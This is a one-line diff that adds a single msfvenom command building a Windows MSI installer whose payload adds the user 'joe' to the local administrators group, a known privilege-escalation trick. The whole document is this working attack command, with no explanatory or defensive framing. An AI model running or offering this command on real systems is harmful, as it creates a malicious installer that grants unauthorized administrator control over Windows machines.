@@ -1,0 +1,1 @@
+msfvenom -p windows/exec CMD='net localgroup administrators joe /add' -f msi > pkg.msi
